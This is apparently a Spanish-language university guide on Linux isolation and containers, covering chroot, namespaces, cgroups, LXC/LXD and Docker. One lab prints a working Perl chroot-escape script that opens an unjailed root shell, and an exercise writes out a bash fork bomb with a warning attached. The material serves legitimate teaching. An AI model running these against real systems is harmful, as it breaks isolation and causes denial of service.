### Introducción a contenedores en Linux
Universidad ICESI  
Curso: Sistemas Operativos  
Docente: Daniel Barragán C.  
Tema: Introducción a contenedores en Linux  
Correo: daniel.barragan at correo.icesi.edu.co

### Objetivos
* Conocer los fundamentos de las tecnologías de contenedores tipo LXC y LXD en Linux
* Conocer las diferencias entre las tecnologías de virtualización LXC, LXD y Docker, Rocket
* Crear entornos aislados para la ejecución de procesos a nivel del sistema operativo

### Introducción
En esta guía se introducen conceptos acerca de la tecnología de contenedores virtuales y sus fundamentos. Además se presentan 
ejemplos a través de los cuales se podrá experimentar con cada una de dichas tecnologías. La información presentada es resultado de la recopilación de distintas fuentes de información, las referencias se presentan al final de la guía.

### Desarrollo

#### Chroot
**chroot** en los sistemas operativos derivados de Unix, es una operación que invoca un proceso, cambiando para este y sus hijos el directorio raíz del sistema. El sistema chroot fue introducido por Bill Joy el 18 de marzo de 1982.

La creación de un ambiente aislado con **chroot** implica varios pasos. En esta guía se empleará la herramienta jailkit que automatiza varios de los pasos para crear entornos **chroot** 

Es posible instalar el rpm de jailkit directamente, sin embargo a continuación se presentan los pasos para la instalación desde las fuentes

```console
# yum install wget -y
# yum install bzip2 -y
# cd /tmp
# wget http://repo.iotti.biz/CentOS/7/srpms/jailkit-2.17-1.el7.lux.1.src.rpm
# rpm2cpio jailkit-2.17-1.el7.lux.1.src.rpm | cpio -idmv
# tar xvf jailkit-2.17.tar.bz2
# cd jailkit-2.17/
# ./configure
# make
# make install 

# adduser jane
# mkdir /home/jail
# chown root:root /home/jail
# jk_init -v -j /home/jail basicshell editors extendedshell netutils ssh sftp scp jk_lsh
# jk_jailuser -m -j /home/jail jane
# mkdir /home/jail/tmp
# chmod a+rwx /home/jail/tmp
# vi /home/jail/etc/passwd
root:x:0:0:root:/root:/bin/bash
jane:x:1004:1004::/home/jane:/bin/bash
```

#### Usando chroot

Edite el archivo de configuración ssh para permitir conexiones remotas
```
vi /etc/ssh/sshd_config
```
```
# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication yes
#PermitEmptyPasswords no
#PasswordAuthentication no
```

Reinicie el servicio de ssh
```
# systemctl restart sshd
```

Realice una conexión remota como el usuario jane
```
# ssh jane@127.0.0.1
```

Una vez haya accedido con ssh, observe los archivos y directorios en la raíz
```
$ cd /
$ ls -al
```

**Nota**: Los entornos **chroot** no deben ser diseñados para aislar al usuario root. 

#### Escapando de chroot

A continuación se demuestra como el usuario root puede **escapar** del ambiente aislado chroot.

Existen versiones de esta prueba en lenguaje C, para lo cual se requiere que en el entorno chroot se haya instalado
el compilador de C. Esta versión usa el lenguaje perl, por tanto se requiere que la **victima** al haber creado el entorno de chroot, haya realizado la instalación de perl. 

Ejecute el siguiente comando para simular que se cuenta con el compilador de perl en el ambiente chroot
```
# jk_init -v -j /home/jail perl
```

Ingrese al ambiente chroot como root ejecutando el siguiente comando

```
# chroot /home/jail
```

Verifique que se encuentra dentro del entorno de chroot listando los archivos en el directorio raíz
```
# ls /
```

Por medio de un editor de texto escriba el siguiente script
```
vi prisionbreak.pl
```
```
#!/usr/bin/perl -w
use strict;
# unchroot.pl Dec 2007
# http://pentestmonkey.net/blog/chroot-breakout-perl

# This script may be used for legal purposes only.

# Go to the root of the jail
chdir "/";

# Open filehandle to root of jail
opendir JAILROOT, "." or die "ERROR: Couldn't get file handle to root of jailn";

# Create a subdir, move into it
mkdir "mysubdir";
chdir "mysubdir";

# Lock ourselves in a new jail
chroot ".";

# Use our filehandle to get back to the root of the old jail
chdir(*JAILROOT);

# Get to the real root
while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
        chdir "..";
}

# Lock ourselves in real root - so we're not really in a jail at all now
chroot ".";

# Start an un-jailed shell
system("/bin/sh");
```

Ejecute el script, y posteriormente vuelva a listar los archivos del directorio raíz
```
# ./prisionbreak.pl
# ls
```

**Nota**: Por favor no ser un script kiddie http://www.urbandictionary.com/define.php?term=script%20kiddie

#### FreeBSD Jails
FreeBSD es un sistema operativo open-source y descendiente directo de BSD (Berkeley Software Distribution). La primera versión fue liberada en 1993 y hoy en día es un sistema operativo ampliamente usada alrededor del mundo. La diferencia principal con Linux, es que FreeBSD es un sistema operativo completo (kernel, drivers de dispositivos, utilidades y documentación). Además la licencia que usa es la BSD license que permite modificaciones en el código fuente sin la obligación de liberar los cambios.

Las jaulas son un mecanismo de seguridad y una implementación para dar soporte a la virtualización. Es una mejora al método tradicional de chroot que aparece en la versión 4 de FreeBSD. Un proceso que se ejecuta en una jaula no puede acceder a recursos
por fuera de ella. Cada jaula tiene su propio hostname y dirección IP. Es posible ejecutar varias jaulas a la vez pero estas se ejecutan sobre el mismo kernel, por tanto solo se pueden ejecutar en ellas software soportado por el kernel de FreeBSD.
 
#### Namespaces

La tecnología de namespaces permite crear a partir de recursos globales del sistema, abstracciones de dichos recursos que pueden
ser usadas dentro de ambientes aislados por algun proceso del sistema operativo. Los cambios del recurso a nivel de un namespace
solo son visibles para los procesos dentro de dicho namespace. Uno de los usos de los namespaces es para implementar contenedores.

Linux tiene los siguientes namespaces:

| Namespace | Constant | Isolates |
|------|------|------|
| Cgroup | CLONE_NEWCGROUP | Cgroup root directory |  
| IPC | CLONE_NEWIPC | System V IPC, POSIX message queues |  
| Network | CLONE_NEWNET | Network devices, stacks, ports, etc. |  
| Mount | CLONE_NEWNS | Mount points |  
| PID | CLONE_NEWPID | Process IDs |  
| User | CLONE_NEWUSER | User and group IDs  | 
| UTS | CLONE_NEWUTS | Hostname and NIS domain name |  

La API de namespaces incluye las llamadas al sistema: clone, setns, unshare  

#### Process Namespace

El namespace de procesos, permite que un proceso tenga múltiples identificadores o PIDs. El siguiente código fuente en C muestra las estructuras que son empleadas por el kernel de Linux para almacenar múltiples identificadores por proceso:

```
struct upid {
  int nr;                     // the PID value
  struct pid_namespace *ns;   // namespace where this PID is relevant
  // ...
};

struct pid {
  // ...
  int level;                  // number of upids
  struct upid numbers[0];     // array of upids
};
```
El siguiente código fuente muestra un ejemplo del namespace de procesos en funcionamiento. Al realizar su compilación y ejecución como el usuario root, se observa como el proceso dentro del namespace tiene como identificador ó PID el número 1, mientras que el proceso que hace el llamado a **clone** tiene un identificador convencional de acuerdo con un proceso que ya hace parte de un árbol de procesos.

```
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

static char child_stack[1048576];

static int child_fn() {
  printf("PID: %ld\n", (long)getpid());
  return 0;
}

int main() {
  pid_t child_pid = clone(child_fn, child_stack+1048576, CLONE_NEWPID | SIGCHLD, NULL);
  printf("clone() = %ld\n", (long)child_pid);

  waitpid(child_pid, NULL, 0);
  return 0;
}
```

Compile y ejecute el siguiente código fuente. Observe como el número de identificador para el padre del proceso dentro del namespace es 0. Esto indica que dicho proceso dentro del namespace no tiene un proceso padre.

```
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

static char child_stack[1048576];

static int child_fn() {
  printf("Parent PID: %ld\n", (long)getppid());
  return 0;
}

int main() {
  pid_t child_pid = clone(child_fn, child_stack+1048576, CLONE_NEWPID | SIGCHLD, NULL);
  printf("clone() = %ld\n", (long)child_pid);

  waitpid(child_pid, NULL, 0);
  return 0;
}
```

Compile y ejecute el siguiente código fuente. Observe como al remover el parámetro **CLONE_NEWPID**, el número del identificador para el padre del proceso ya no es 0.

```
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

static char child_stack[1048576];

static int child_fn() {
  printf("Parent PID: %ld\n", (long)getppid());
  return 0;
}

int main() {
  pid_t child_pid = clone(child_fn, child_stack+1048576, SIGCHLD, NULL);
  printf("clone() = %ld\n", (long)child_pid);

  waitpid(child_pid, NULL, 0);
  return 0;
}
```
#### Linux Network Namespace

El namespace de red permite a cada proceso acceder a las interfaces de red en forma aislada. En este caso la llamada al sistema **clone** emplea el parámetro **CLONE_NEWNET**

Compile y ejecute el siguiente código fuente. Observe como la interfaz de loopback se presenta adentro y afuera del namespace, además observe como por fuera del namespace la interfaz de loopback se encuentra activa y por dentro del namespace se encuentra inactiva.

```
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>


static char child_stack[1048576];

static int child_fn() {
  printf("New `net` Namespace:\n");
  system("ip link");
  printf("\n\n");
  return 0;
}

int main() {
  printf("Original `net` Namespace:\n");
  system("ip link");
  printf("\n\n");

  pid_t child_pid = clone(child_fn, child_stack+1048576, CLONE_NEWPID | CLONE_NEWNET | SIGCHLD, NULL);

  waitpid(child_pid, NULL, 0);
  return 0;
}
```

Para proveer al namespace con una interfaz de red usable se requiere la creación de interfaces de red virtuales dentro del namespace y mecanismos de enrutamiento para direccionar los datos de la interfaz física del sistema operativo hacia las interfaces virtuales. La configuración de puentes ethernet permite la conexión entre namespaces. 

#### Cgroups
Control Groups (CGroups) fue introducido por Google en el 2006 para restringir lor recursos usados por un proceso, fue mezclado (merge) en el código del kernel de Linux en la versión 2.6.24. Todos los recursos que un proceso puede usar tiene su propio controlador de recursos (CGroup Subsystem)

| Resource controller | Description |
|------|------|
| blkio | sets limits on input/output access to and from block devices (see BlockIOWeight) |
| cpu | uses the CPU scheduler to provide CGroup tasks an access to the CPU. It is mounted together with the cpuacct controller on the same mount (see CPUShares) |
| cpuacct | creates automatic reports on CPU resources used by tasks in a CGroup. It is mounted together with the cpu controller on the same mount (see CPUShares) |
| cpuset | assigns individual CPUs (on a multicore system) and memory nodes to tasks in a CGroup |
| devices | allows or denies access to devices for tasks in a CGroup |
| freezer | suspends or resumes tasks in a CGroup |
| memory | sets limits on memory use by tasks in a CGroup, and generates automatic reports on memory resources used by those tasks (see MemoryLimit) |
| net_cls | tags network packets with a class identifier (classid) that allows the Linux traffic controller (the tc command) to identify packets originating from a particular CGroup task |
| perf_event | enables monitoring CGroups with the perf tool |
| hugetlb | allows to use virtual memory pages of large sizes, and to enforce resource limits on these pages |

A continuación se presenta un ejemplo de como controlar la asignación de CPUs por medio de CGroups. La máquina virtual o PC donde realice las pruebas debe tener al menos dos núcleos.

Verifique que el directorio **/sys/fs/cgroup/cpuset** contiene ficheros que nos permiten interactuar con el grupo de control.
```
# cd /sys/fs/cgroup/cpuset
# ls
```

Verifique que cuenta con al menos dos núcleos, debe observar la salida 0-1
```
# cd /sys/fs/cgroup/cpuset
# cat cpuset.cpus
```

Cree los siguientes directorios dentro de /sys/fs/cgroup/cpuset para cada grupo de control
```
# mkdir group_01 group_02
```

Asigne el núcleo 0 de la cpu al grupo de control 1 y el núcleo 1 de la cpu al grupo de control 2. Indicar además que ambos grupos de control pueden acceder al nodo de memoria 0
```
# echo 0 >group_01/cpuset.cpus
# echo 1 >group_02/cpuset.cpus
# echo 0 >group_01/cpuset.mems
# echo 0 >group_02/cpuset.mems
```

Abra dos consolas en el sistema operativo y anote los PIDs del proceso bash
```
# echo $$
```

Las siguientes indicaciones asumen que se obtuvo como PIDs los números 4296 y 4361

Asigne los procesos a cada grupo creado
```
# echo 4296 >group_01/tasks 
# echo 4361 >group_02/tasks 
```

Busque nuevamente los PIDs de los procesos en el archivo tasks
```
# cd /sys/fs/cgroup/cpuset
# cat tasks | grep -E "4296|4361"
```

Ejecute el siguiente script en la consola con PID 4296. Tenga en cuenta ejecutar el código en modo background una vez y anotar los PID:
```
# cd /tmp
# vi consume_cpu.sh

#!/bin/bash
a=0
while true; do a=a+1; done
```

Las siguientes indicaciones asumen que se obtuvo como PID el número 1405

Ingrese al directorio /sys/fs/cgroup/cpuset/group_01 y liste el contenido del archivo tasks. Busque en el contenido el PID con número 1405
```
# cd /sys/fs/cgroup/cpuset/group_01
# cat tasks
```

Observe por medio del comando top en una consola el uso de la cpu, en este caso el uso del núcleo 0. En la interfaz de top presione '1' para visualizar los núcleos del procesador y presion 't' para visualizar las tareas por núcleo.
```
# top
```

Migre el proceso con PID 1405 del grupo de control 1 al grupo de control 2
```
# echo 1405 >group_02/tasks
```

Verifique con top que el proceso se ha migrado de procesador
```
# top
```

#### LXC/LXD
LXC permite ejecutar diferentes sistemas Linux (contenedores) aislados en una máquina Linux. Un contenedor es como un entorno virtual, con su propio espacio de procesos y de red. La tecnología LXC utiliza Linux kernel control groups (Cgroups) y Namespaces (espacios de nombres) para proporcionar este aislamiento. Un contenedor tiene su propia visión del sistema operativo, del espacio de IDs de procesos, de la estructura del sistema de ficheros, y de los interfaces de red. Los comandos para interactuar con lxc tienen el formato lxc-<command>

LXD adiciona características sobre LXC tales como una interfaz REST para la gestión de contenedores a través de la red y soporte nativo para OpenStack. Los comandos para interactuar con lxd tienen el formato lxc <command>

#### Kernel Capabilities, SELinux y AppArmor
El demonio de docker requiere de privilegios de root para su ejecución, por lo tanto hay recomendaciones que se deben tener en cuenta para reducir los vectores de vulnerabilidades al emplear tecnologías de contenedores virtuales.

#### Docker y Algo más
Docker es un proyecto de código abierto que automatiza el despliegue de aplicaciones dentro de contenedores de software, proporcionando una capa adicional de abstracción y automatización de virtualización a nivel de sistema operativo. Docker utiliza características de aislamiento de recursos del kernel de Linux, tales como cgroups y espacios de nombres (namespaces) para permitir que procesos independientes se ejecuten dentro de una sola instancia de Linux.

Docker inicialmente usaba la tecnología LXC para la virtualización de recursos, la cual se encarga del manejo de los namespaces, cgroups, capabilities y controles de acceso al filesystem para los procesos que se ejecutaban en contenedores virtuales. Desde la versión 0.9 de docker, la herramienta para virtualización por defecto es el componente opensource libcontainer. libcontainer fue inicialmente escrita en Go, pero tiempo después proveedores de servicios en la nube la portaron a otros lenguajes como C, C++ y ASP.Net.

Aunque docker es el estándar de facto en la industria para el despliegue de contenedores virtuales, ya se pueden encontrar
proyectos similares en curso, como por ejemplo rocket de CoreOS.

**Nota:** Es posible emplear docker con LXC iniciando el demonio de docker con el comando **docker -e -x lxc**

### Actividades

* Investigue en que consiste una bomba fork y como prevenirla usando las herramientas vistas en esta guía.

**Nota:** NO ejecute este comando en una consola hasta investigar primero que hace
```
# :(){ :|: & };:
```

### Referencias
http://linuxpitstop.com/chroot-ssh-users-on-centos-7/  
http://www.tldp.org/pub/Linux/docs/ldp-archived/system-admin-guide/translations/es/html/ch05s02.html  
https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/devices.txt
http://pentestmonkey.net/blog/chroot-breakout-perl

https://www.freebsd.org/  

http://man7.org/linux/man-pages/man7/namespaces.7.html  
https://www.toptal.com/linux/separation-anxiety-isolating-your-system-with-linux-namespaces  
https://securityinside.info/contenedores-linux-seguridad/  

https://www.certdepot.net/rhel7-get-started-cgroups/
http://epistolatory.blogspot.com.co/2014/07/first-sysadmin-impressions-on-rhel-7.html
https://www.freedesktop.org/wiki/Software/systemd/MyServiceCantGetRealtime/
https://blog.docker.com/2013/08/containers-docker-how-secure-are-they/  
https://elpuig.xeill.net/Members/vcarceler/articulos/introduccion-a-los-grupos-de-control-cgroups-de-linux

http://www.itzgeek.com/how-tos/linux/centos-how-tos/setup-linux-container-with-lxc-on-centos-7-rhel-7.html
https://www.hiroom2.com/2017/03/24/centos-7-run-containers-with-lxd-lxc/
https://github.com/fgrehm/vagrant-lxc
https://www.jpablo128.com/por-que-usar-lxc-linux-containers/
https://linuxcontainers.org/lxd/
https://www.openstack.org/
https://discuss.linuxcontainers.org/t/comparing-lxd-vs-lxc/24
https://linuxcontainers.org/lxd/getting-started-cli/
https://www.ctl.io/developers/blog/post/linux-lxd-hypervisor-containers
http://www.zdnet.com/article/ubuntu-lxd-not-a-docker-replacement-a-docker-enhancement/

https://medium.com/@tiffanyfayj/docker-1-11-et-plus-engine-is-now-built-on-runc-and-containerd-a6d06d7e80ef
https://godoc.org/github.com/opencontainers/runc/libcontainer
http://www.zdnet.com/article/docker-libcontainer-unifies-linux-container-powers/
https://github.com/opencontainers/runc/tree/master/libcontainer

https://lwn.net/Articles/676831/
